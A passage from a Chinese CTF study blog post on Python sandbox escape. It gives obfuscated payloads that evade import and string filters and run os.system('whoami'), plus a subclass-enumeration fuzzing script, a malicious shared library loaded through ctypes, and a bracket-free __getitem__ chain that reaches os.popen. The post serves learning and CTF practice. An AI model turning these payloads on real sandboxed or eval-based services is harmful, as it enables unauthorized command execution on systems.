+<p>也可以fuzz一下其他的方法比如 <code>sys</code>（<code>sys.modules[&quot;os&quot;].system(&quot;whoami&quot;)</code>），举一反三就行</p>
+<ul>
+<li><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">'os'</span>)</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>) //注意导入importlib</span><br></pre></td></tr></table></figure>
+
+<p>  如果通过 <code>sys.modules[&#39;os&#39;] = None</code>,那么就无法导入 <code>os</code>但import 的原理，本质上就是执行一遍导入的库。路径可以通过 <code>sys.path</code>查看，默认都是在 <code>/usr/lib/python3X/</code></p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'/usr/lib/python3.8/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"><span class="keyword">system</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sys.modules[<span class="string">'os'</span>]= <span class="string">'/usr/lib/python3.8/os.py'</span></span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">del sys.modules[<span class="string">'os'</span>] //当 <span class="keyword">import</span> 一个模块时：<span class="keyword">import</span> A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 <span class="keyword">module</span> 对象，并加载 A。所以删了 sys.modules[<span class="string">'os'</span>] 只会让 Python 重新加载一次 os。</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>  字符串拼接</p>
+  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>  字符串逆转</p>
+  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span>(<span class="string">'so'</span>[::-<span class="number">1</span>])<span class="selector-class">.system</span>(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  变量替换</p>
+  <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">a</span>=<span class="string">'o'</span></span><br><span class="line">b=<span class="string">'s'</span></span><br><span class="line">__import__(<span class="keyword">a</span>+b).<span class="keyword">system</span>(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  编码</p>
+  <figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>((<span class="variable">bytes.fromhex</span>(<span class="string">"6f73"</span>).decode())).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>  别名</p>
+  <figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="继承逃逸"><a href="#继承逃逸" class="headerlink" title="继承逃逸"></a>继承逃逸</h4><p>  python中万物皆对象。通过各种魔术函数可以在继承链上找到我们需要的函数。也可以通过脚本FUZZ一下</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这里只爆破了一层</span></span><br><span class="line"><span class="comment"># object</span></span><br><span class="line"><span class="comment"># [].__class__.__base__</span></span><br><span class="line"><span class="comment"># "".__class__.__mro__[-1]</span></span><br><span class="line">methods=[<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line"></span><br><span class="line">classes = [].__class__.__base__.__subclasses__()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line"></span><br><span class="line">    res[met] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(classes)):</span><br><span class="line">        cla = str(classes[i])</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> cla:</span><br><span class="line">            res[met].append(str(i) + <span class="string">" "</span> + cla)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># dir() 不会列出内置函数和变量名称所以 exec和eval只能爆破，或者利用其他包的__builtins__调用</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"__globals__"</span> <span class="keyword">in</span> dir(classes[i].__init__):</span><br><span class="line">            <span class="keyword">if</span> met <span class="keyword">in</span> classes[i].__init__.__globals__:</span><br><span class="line">                res[met].append(str(i)+ <span class="string">" "</span>+cla)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met + <span class="string">":"</span> + str(res[met]))</span><br></pre></td></tr></table></figure>
+
+<p>  类的序号在不同的py版本，运行平台，以及import不同的包，都会造成<code>object</code>的子类数量不一样，序号也就不一样了。脚本也就构造下payload，远程打过去还得爆破序号。</p>
+</li>
+<li><h4 id="加载恶意so"><a href="#加载恶意so" class="headerlink" title="加载恶意so"></a>加载恶意so</h4><p>  利用<code>ctypes.LibraryLoader</code>加载恶意动态库执行命令。<code>ctypes</code>必须要导入，不然<code>object</code>不会有它。感觉有些鸡肋。</p>
+<p>  evil.c</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ls -la  &gt; /tmp/ls_la"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>  poc.py</p>
+  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">167</span>](<span class="string">'/tmp/evil.so'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>  <img src="/2020/06/python-web学习/image-20200701212037508.png" alt="image-20200701212037508"></p>
+</li>
+<li><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>  过滤<code>[</code>、<code>]</code>，应对的方式就是将[]的功能用pop 、<code>__getitem__</code> 代替（实际上a[0]就是在内部调用了<code>a.__getitem__(0)</code> )</p>
+<p>   <code>&#39;&#39;.__class__.__mro__.__getitem__(1).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</code></p>
+</li>
+</ul>
+<ul>
+<li><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>  <a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98" target="_blank" rel="noopener">沙盒逃逸备忘</a></p>
+<p>  <a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python-沙箱逃逸</a></p>
+<p>  <a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2020/06/nodejs学习/" rel="bookmark">nodejs学习</a></div>
+      
+    </li>
+  
+  </ul>
+
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>0xCreed</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://0xcreed.jxustctf.top/2020/06/python-web学习/" title="python_web学习">https://0xcreed.jxustctf.top/2020/06/python-web学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+		<div>
+		
+			
+				<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+			
+			
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/web/" rel="tag"> <i class="fa fa-tag"></i> web</a>
+			   
+            
+              <a href="/tags/python/" rel="tag"> <i class="fa fa-tag"></i> python</a>
+			   
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/06/RCTF2020-复现/" rel="next" title="RCTF2020-复现">
+                  <i class="fa fa-chevron-left"></i> RCTF2020-复现
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/06/命令执行与绕过/" rel="prev" title="命令执行与绕过">
+                  命令执行与绕过 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+	
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+	
+	  </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-沙箱逃逸"><span class="nav-number">1.</span> <span class="nav-text">1.沙箱逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#执行系统命令"><span class="nav-number">1.0.1.</span> <span class="nav-text">执行系统命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#执行Python代码"><span class="nav-number">1.0.2.</span> <span class="nav-text">执行Python代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键方法"><span class="nav-number">1.0.3.</span> <span class="nav-text">关键方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import-导入机制"><span class="nav-number">1.0.4.</span> <span class="nav-text">import 导入机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#花式import"><span class="nav-number">1.0.5.</span> <span class="nav-text">花式import</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#花式处理字符串"><span class="nav-number">1.0.6.</span> <span class="nav-text">花式处理字符串</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#继承逃逸"><span class="nav-number">1.0.7.</span> <span class="nav-text">继承逃逸</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#加载恶意so"><span class="nav-number">1.0.8.</span> <span class="nav-text">加载恶意so</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#其他"><span class="nav-number">1.0.9.</span> <span class="nav-text">其他</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Referer"><span class="nav-number">1.0.10.</span> <span class="nav-text">Referer</span></a></li></ol></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/1.gif"
+      alt="0xCreed">
+  <p class="site-author-name" itemprop="name">0xCreed</p>
+  <div class="site-description" itemprop="description">Winter is coming</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">35</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/0xCreed" title="GitHub &rarr; https://github.com/0xCreed" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      推荐阅读
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/mwq1024/" title="https://www.cnblogs.com/mwq1024/" rel="noopener" target="_blank">旧博客</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https://www.leavesongs.com/" rel="noopener" target="_blank">离别歌</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://li1m.github.io/" title="https://li1m.github.io/" rel="noopener" target="_blank">LiM</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+	  
+	  
+	
+
+    </div>
+  </aside>
+
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+      <style>
+    #aplayer {
+        width: 50%;
+        margin: 0 auto;
+    }
+    @media screen and (max-device-width: 400px) {
+        #aplayer {
+            width: 100%;
+        }
+    }
+      </style>
+      <link rel="stylesheet" href="/dist/APlayer.min.css">
+      <div id="aplayer"></div>
+      <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+      <script type="text/javascript" src="/dist/music.js"></script>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">0xCreed</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">242k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">3:40</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '0eYM2A8pUSnA2EEyrujClGRN-MdYXbMMI',
+    appKey: 'BJmUYA3jJHocnfnm4LpPR9Ow',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
